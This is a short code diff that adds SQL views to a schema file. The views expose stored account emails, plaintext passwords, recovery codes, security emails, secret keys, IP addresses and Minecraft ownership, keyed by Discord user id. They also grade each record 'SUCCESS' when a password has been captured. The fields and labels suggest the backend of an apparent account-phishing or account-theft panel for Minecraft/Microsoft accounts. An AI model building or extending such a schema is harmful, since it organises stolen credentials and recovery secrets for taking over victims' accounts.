@@ -452,7 +452,40 @@ accountsbyuser: `CREATE TABLE IF NOT EXISTS accountsbyuser(
   idx_accountsbyuser_user: `CREATE INDEX IF NOT EXISTS idx_accountsbyuser_user ON accountsbyuser(user_id)`,
   idx_stats_name: `CREATE INDEX IF NOT EXISTS idx_stats_name ON stats(name)`,
   idx_cosmetics_name: `CREATE INDEX IF NOT EXISTS idx_cosmetics_name ON cosmetics(name)`,
-  idx_web_access_expiry: `CREATE INDEX IF NOT EXISTS idx_web_access_expiry ON web_access(expiry)`
+  idx_web_access_expiry: `CREATE INDEX IF NOT EXISTS idx_web_access_expiry ON web_access(expiry)`,
+  idx_leaderboard_user: `CREATE UNIQUE INDEX IF NOT EXISTS idx_leaderboard_user ON leaderboard(user_id)`,
+
+  v_all_accounts: `CREATE VIEW IF NOT EXISTS v_all_accounts AS
+    SELECT 
+      a.uid,
+      a.user_id AS discord_user_id,
+      a.username,
+      a.ownsmc,
+      a.capes,
+      a.email,
+      a.recoverycode,
+      a.secemail,
+      a.secretkey,
+      a.password,
+      a.stats_id,
+      a.time AS timestamp,
+      e.ip,
+      e.creationdate,
+      e.cards AS cardstatus,
+      e.devicestatus,
+      e.hasmc,
+      CASE 
+        WHEN a.email = 'Locked!' THEN 'LOCKED'
+        WHEN a.username = 'xbl failed' THEN 'XBL_FAILED'
+        WHEN a.password IS NOT NULL AND a.password != '' THEN 'SUCCESS'
+        ELSE 'INCOMPLETE'
+      END AS health_status,
+      'Completed' AS process_status
+    FROM accounts a
+    LEFT JOIN extrainformation e ON a.uid = e.uid`,
+
+  v_failed_accounts: `CREATE VIEW IF NOT EXISTS v_failed_accounts AS
+    SELECT * FROM v_all_accounts WHERE health_status != 'SUCCESS'`
 };
 
 
